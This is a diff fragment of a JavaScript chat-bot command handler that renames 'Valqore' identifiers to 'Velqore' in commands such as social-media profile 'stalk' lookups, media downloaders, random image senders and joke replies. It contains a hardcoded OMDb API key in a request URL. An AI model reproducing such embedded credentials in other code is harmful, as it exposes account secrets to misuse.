-	  if (!text) return replygcValqore(`Username? `)
+	  if (!text) return replygcVelqore(`Username? `)
   let res = await fg.ttStalk(args[0])
   let txt = `
 ┌──「 *TIKTOK STALK* 
@@ -4371,11 +4367,11 @@ case 'tiktokstalk': {
 
 ▢ *🔗 Link* : https://tiktok.com/${res.username}
 └────────────`
-  await ValqoreInc.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: m})
+  await VelqoreInc.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: m})
 }
 break
 case 'xxxigstalk': {
-if (!text) return replygcValqore(`Enter Instagram Username\n\nExample: ${prefix + command} unicorn_Valqore13`)
+if (!text) return replygcVelqore(`Enter Instagram Username\n\nExample: ${prefix + command} unicorn_Velqore13`)
     let res = await fg.igStalk(text)
     let te = `
 ┌──「 *STALKING* 
@@ -4387,15 +4383,15 @@ if (!text) return replygcValqore(`Enter Instagram Username\n\nExample: ${prefix 
 ▢ *🏝️Posts:* ${res.postsH}
 ▢ *🔗 Link* : https://instagram.com/${res.username.replace(/^@/, '')}
 └────────────`
-     await ValqoreInc.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m})
+     await VelqoreInc.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m})
 }
 break
 case 'ghstalk': case 'githubstalk':{
-if (!q) return replygcValqore(`Example ${prefix+command} Valqore`)
-await ValqoreStickWait()
+if (!q) return replygcVelqore(`Example ${prefix+command} Velqore`)
+await VelqoreStickWait()
 let githubstalk = require('./lib/scraper')
 aj = await githubstalk.githubstalk(`${q}`)
-ValqoreInc.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
+VelqoreInc.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
 `*/ Github Stalker \\*
 
 Username : ${aj.username}
@@ -4420,11 +4416,11 @@ Updated At : ${aj.updated_at}` }, { quoted: m } )
 }
 break
 case 'npmstalk':{
-if (!q) return replygcValqore(`Example ${prefix+command} Valqoreapi`)
-await ValqoreStickWait()
+if (!q) return replygcVelqore(`Example ${prefix+command} Velqoreapi`)
+await VelqoreStickWait()
 let npmstalk = require('./lib/scraper')
 eha = await npmstalk.npmstalk(q)
-replygcValqore(`*/ Npm Stalker \\*
+replygcVelqore(`*/ Npm Stalker \\*
 
 Name : ${eha.name}
 Version Latest : ${eha.versionLatest}
@@ -4437,22 +4433,22 @@ Latest Publish Time : ${eha.latestPublishTime}`)
 }
 break
 case 'ffstalk':{
-if (!q) return replygcValqore(`Example ${prefix+command} 946716486`)
-await ValqoreStickWait()
+if (!q) return replygcVelqore(`Example ${prefix+command} 946716486`)
+await VelqoreStickWait()
 let ffstalk = require('./lib/scraper')
 eeh = await ffstalk.ffstalk(`${q}`)
-replygcValqore(`*/ Free Fire Stalker \\*
+replygcVelqore(`*/ Free Fire Stalker \\*
 
 Id : ${eeh.id}
 Nickname : ${eeh.nickname}`)
 }
 break
 case 'mlstalk': {
-if (!q) return replygcValqore(`Example ${prefix+command} 530793138|8129`)
-await ValqoreStickWait()
+if (!q) return replygcVelqore(`Example ${prefix+command} 530793138|8129`)
+await VelqoreStickWait()
 let mlstalk = require('./lib/scraper')
 let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
-replygcValqore(`*/ Mobile Legend Stalker \\*
+replygcVelqore(`*/ Mobile Legend Stalker \\*
 
 Username : ${dat.userName}
 Id : ${q.split("|")[0]}
@@ -4460,13 +4456,13 @@ ID Zone: ${q.split("|")[1]}`)
 }
 break
 case 'spotify':{
-	if (!text) return replygcValqore(`*Please enter a song name*`)
+	if (!text) return replygcVelqore(`*Please enter a song name*`)
     try {
         const apiUrl = `https://www.guruapi.tech/api/spotifyinfo?text=${encodeURIComponent(text)}`
         const response = await fetch(apiUrl);
         if (!response.ok) {
             console.log('Error searching for song:', response.statusText)
-            return replygcValqore('Error searching for song')
+            return replygcVelqore('Error searching for song')
         }
         const data = await response.json()
         const coverimage = data.spty.results.thumbnail
@@ -4476,7 +4472,7 @@ case 'spotify':{
         const audioResponse = await fetch(dlapi)
         if (!audioResponse.ok) {
             console.log('Error fetching audio:', audioResponse.statusText)
-            return replygcValqore('Error fetching audio')
+            return replygcVelqore('Error fetching audio')
         }
         const audioBuffer = await audioResponse.buffer()
         const tempDir = os.tmpdir()
@@ -4485,7 +4481,7 @@ case 'spotify':{
             await fs.promises.writeFile(audioFilePath, audioBuffer)
         } catch (writeError) {
             console.error('Error writing audio file:', writeError)
-            return replygcValqore( 'Error writing audio file')
+            return replygcVelqore( 'Error writing audio file')
         }
         let doc = {
             audio: {
@@ -4494,7 +4490,7 @@ case 'spotify':{
             mimetype: 'audio/mpeg',
             ptt: true,
             waveform:  [100, 0, 100, 0, 100, 0, 100],
-            fileName: "Valqore",
+            fileName: "Velqore",
             contextInfo: {
               mentionedJid: [m.sender],
               externalAdReply: {
@@ -4507,16 +4503,16 @@ case 'spotify':{
               }
             }
         }        
-        await ValqoreInc.sendMessage(m.chat, doc, { quoted: m })
+        await VelqoreInc.sendMessage(m.chat, doc, { quoted: m })
     } catch (error) {
         console.error('Error fetching Spotify data:', error)
-        return replygcValqore('*Error*')
+        return replygcVelqore('*Error*')
     }
     }
     break
 case 'imdb':
-if (!text) return replygcValqore(`_Name a Series or movie`)
-await ValqoreStickWait()
+if (!text) return replygcVelqore(`_Name a Series or movie`)
+await VelqoreStickWait()
             let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
             let imdbt = ""
             console.log(fids.data)
@@ -4538,7 +4534,7 @@ await ValqoreStickWait()
             imdbt += "🏙️Production : " + fids.data.Production + "\n"
             imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
             imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
-           ValqoreInc.sendMessage(m.chat, {
+           VelqoreInc.sendMessage(m.chat, {
                 image: {
                     url: fids.data.Poster,
                 },
@@ -4548,315 +4544,315 @@ await ValqoreStickWait()
             })
             break
             case 'ebinary': {
-if (!q) return replygcValqore(`Send/reply text with captions ${prefix + command}`)
+if (!q) return replygcVelqore(`Send/reply text with captions ${prefix + command}`)
 let { eBinary } = require('./lib/binary')
 let eb = await eBinary(`${q}`)
-replygcValqore(eb)
+replygcVelqore(eb)
 }
 break
 case 'dbinary': {
-if (!q) return replygcValqore(`Send/reply text with captions ${prefix + command}`)
+if (!q) return replygcVelqore(`Send/reply text with captions ${prefix + command}`)
 let { dBinary } = require('./lib/binary')
 let db = await dBinary(`${q}`)
-replygcValqore(db)
+replygcVelqore(db)
 }
 break
 case 'happymod':{
-if (!q) return replygcValqore(`Example ${prefix+command} Sufway surfer mod`)
-await ValqoreStickWait()
+if (!q) return replygcVelqore(`Example ${prefix+command} Sufway surfer mod`)
+await VelqoreStickWait()
 let kat = await scp2.happymod(q)
-replygcValqore(util.format(kat))
+replygcVelqore(util.format(kat))
 }
 break
 case 'gdrive': {
-		if (!args[0]) return replygcValqore(`Enter the Google Drive link`)
-	await ValqoreStickWait()
+		if (!args[0]) return replygcVelqore(`Enter the Google Drive link`)
+	await VelqoreStickWait()
 	const fg = require('api-dylux')
 	try {
 	let res = await fg.GDriveDl(args[0])
-	 await replygcValqore(`
+	 await replygcVelqore(`
 ≡ *Google Drive DL*
 ▢ *Nama:* ${res.fileName}
 ▢ *Size:* ${res.fileSize}
 ▢ *Type:* ${res.mimetype}`)
-	ValqoreInc.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
+	VelqoreInc.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
    } catch {
-	replygcValqore('Error: Check link or try another link') 
+	replygcVelqore('Error: Check link or try another link') 
   }
 }
 break
 case 'pinterest': {
-if (!text) return replygcValqore(`Enter Query`)
+if (!text) return replygcVelqore(`Enter Query`)
 let { pinterest } = require('./lib/scraper')
 anutrest = await pinterest(text)
 result = anutrest[Math.floor(Math.random() * anutrest.length)]
-ValqoreInc.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
 }
 break
 case 'ringtone': {
-		if (!text) return replygcValqore(`Example : ${prefix + command} black rover`)
+		if (!text) return replygcVelqore(`Example : ${prefix + command} black rover`)
         let ringtone = require('./lib/scraper')
 		let anutone2 = await ringtone(text)
 		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
-		ValqoreInc.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
+		VelqoreInc.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
 	    }
 	    break
 case 'tiktokgirl':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var asupan = JSON.parse(fs.readFileSync('./src/media/tiktokvids/tiktokgirl.json'))
 var hasil = pickRandom(asupan)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
 break
 case 'tiktokghea':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var gheayubi = JSON.parse(fs.readFileSync('./src/media/tiktokvids/gheayubi.json'))
 var hasil = pickRandom(gheayubi)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
 break
 case 'tiktokbocil':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var bocil = JSON.parse(fs.readFileSync('./src/media/tiktokvids/bocil.json'))
 var hasil = pickRandom(bocil)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
 break
 case 'tiktoknukhty':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var ukhty = JSON.parse(fs.readFileSync('./src/media/tiktokvids/ukhty.json'))
 var hasil = pickRandom(ukhty)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
 break
 case 'tiktoksantuy':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var santuy = JSON.parse(fs.readFileSync('./src/media/tiktokvids/santuy.json'))
 var hasil = pickRandom(santuy)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
 break
 case 'tiktokkayes':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var kayes = JSON.parse(fs.readFileSync('./src/media/tiktokvids/kayes.json'))
 var hasil = pickRandom(kayes)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
 break
 case 'tiktokpanrika':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var rikagusriani = JSON.parse(fs.readFileSync('./src/media/tiktokvids/panrika.json'))
 var hasil = pickRandom(rikagusriani)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
 break
 case 'tiktoknotnot':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokvids/notnot.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
 break
 case 'chinese':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/china.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'hijab':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/hijab.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'indo':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/indonesia.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'japanese':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/japan.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'korean':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/korea.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'malay':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/malaysia.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'randomgirl':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'randomboy':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random2.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'thai':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/thailand.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'vietnamese':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/vietnam.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'aesthetic':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/aesthetic.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'antiwork':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/antiwork.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'blackpink':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/blackpink.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'bike':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/bike.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'boneka':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/boneka.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'cosplay':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/cosplay.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'cat':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/cat.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'doggo':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/doggo.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'justina':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/justina.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'kayes':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/kayes.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'kpop':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/kpop.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'notnot':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/notnot.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'car':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/car.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'couplepp': case 'ppcouple': {
 let anu = require('./src/media/randompics/ppcouple.json')
 let random = anu[Math.floor(Math.random() * anu.length)]
-ValqoreInc.sendMessage(from, { image: { url: random.male }, caption: `Couple pp for male` }, { quoted: m })
-ValqoreInc.sendMessage(from, { image: { url: random.female }, caption: `Couple pp for female` }, { quoted: m })
+VelqoreInc.sendMessage(from, { image: { url: random.male }, caption: `Couple pp for male` }, { quoted: m })
+VelqoreInc.sendMessage(from, { image: { url: random.female }, caption: `Couple pp for female` }, { quoted: m })
 }
 break
 case 'profilepic':  case 'profilepicture':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/profile.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'pubg':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/pubg.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'rose':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/rose.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'ryujin':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ryujin.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'ulzzangboy':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ulzzangboy.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'ulzzanggirl':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ulzzanggirl.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'wallml': case 'wallpaperml':case 'mobilelegend':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/wallml.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'wallpaperphone': case 'wallphone':
-await ValqoreStickWait()
+await VelqoreStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/wallhp.json'))
 var hasil = pickRandom(notnot)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
             case 'remini': {
-			if (!quoted) return replygcValqore(`Where is the picture?`)
-			if (!/image/.test(mime)) return replygcValqore(`Send/Reply Photos With Captions ${prefix + command}`)
-			await ValqoreStickWait()
+			if (!quoted) return replygcVelqore(`Where is the picture?`)
+			if (!/image/.test(mime)) return replygcVelqore(`Send/Reply Photos With Captions ${prefix + command}`)
+			await VelqoreStickWait()
 			const { remini } = require('./lib/remini')
 			let media = await quoted.download()
 			let proses = await remini(media, "enhance")
-			ValqoreInc.sendMessage(m.chat, { image: proses, caption: mess.success}, { quoted: m})
+			VelqoreInc.sendMessage(m.chat, { image: proses, caption: mess.success}, { quoted: m})
 			}
 			break
 			case 'define': 
-if (!q) return replygcValqore(`What do you want to define?`)
+if (!q) return replygcVelqore(`What do you want to define?`)
 try {
 targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
-if (!targetfine) return replygcValqore(mess.error)
+if (!targetfine) return replygcVelqore(mess.error)
 const reply = `
 *${themeemoji} Word:* ${q}
 *${themeemoji} Definition:* ${targetfine.data.list[0].definition
@@ -4865,71 +4861,71 @@ const reply = `
 *${themeemoji} Example:* ${targetfine.data.list[0].example
     .replace(/\[/g, "")
     .replace(/\]/g, "")}`
-   ValqoreInc.sendMessage(m.chat,{text:reply},{quoted:m})
+   VelqoreInc.sendMessage(m.chat,{text:reply},{quoted:m})
 } catch (err) {
     console.log(err)
-    return replygcValqore(`*${q}* isn't a valid text`)
+    return replygcVelqore(`*${q}* isn't a valid text`)
     }
     break
                 case 'can': {
-            	if (!text) return replygcValqore(`Ask question\n\nExample : ${prefix + command} i dance?`)
+            	if (!text) return replygcVelqore(`Ask question\n\nExample : ${prefix + command} i dance?`)
             	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
                 let keh = bisa[Math.floor(Math.random() * bisa.length)]
                 let jawab = `*Can ${text}*\nAnswer : ${keh}`
-            await replygcValqore(jawab)
+            await replygcVelqore(jawab)
             }
             break
             case 'is': {
-            	if (!text) return replygcValqore(`Ask question\n\nExample : ${prefix + command} she virgin?`)
+            	if (!text) return replygcVelqore(`Ask question\n\nExample : ${prefix + command} she virgin?`)
             	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
                 let kah = apa[Math.floor(Math.random() * apa.length)]
                 let jawab = `*Is ${text}*\nAnswer : ${kah}`                
-            await replygcValqore(jawab)
+            await replygcVelqore(jawab)
             }
             break
             case 'when': {
-            	if (!text) return replygcValqore(`Ask question\n\nExample : ${prefix + command} will i get married?`)
+            	if (!text) return replygcVelqore(`Ask question\n\nExample : ${prefix + command} will i get married?`)
             	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
                 let koh = kapan[Math.floor(Math.random() * kapan.length)]
                 let jawab = `*${command} ${text}*\nAnswer : ${koh}`                
-            await replygcValqore(jawab)
+            await replygcVelqore(jawab)
             }
             break
 case 'what': {
-            	if (!text) return replygcValqore(`Ask question\n\nExample : ${prefix + command} is your name?`)
+            	if (!text) return replygcVelqore(`Ask question\n\nExample : ${prefix + command} is your name?`)
             	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
                 let kah = lel[Math.floor(Math.random() * lel.length)]
                 let jawab = `*What ${text}*\nAnswer : ${kah}`                
-            await replygcValqore(jawab)
+            await replygcVelqore(jawab)
             }
             break
 case 'where': {
-if (!text) return replygcValqore(`Ask question\n\nExample : ${prefix + command} is your name?`)
+if (!text) return replygcVelqore(`Ask question\n\nExample : ${prefix + command} is your name?`)
             	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
                 let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                 let jawab = `*Whwre ${text}*\nAnswer : ${kah}`              
-            await replygcValqore(jawab)
+            await replygcVelqore(jawab)
             }
             break
 case 'how': {
-            	if (!text) return replygcValqore(`Ask question\n\nExample : ${prefix + command} to date girl?`)
+            	if (!text) return replygcVelqore(`Ask question\n\nExample : ${prefix + command} to date girl?`)
             	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
                 let kah = gimana[Math.floor(Math.random() * gimana.length)]
                 let jawab = `*How ${text}*\nAnswer : ${kah}`                
-            await replygcValqore(jawab)
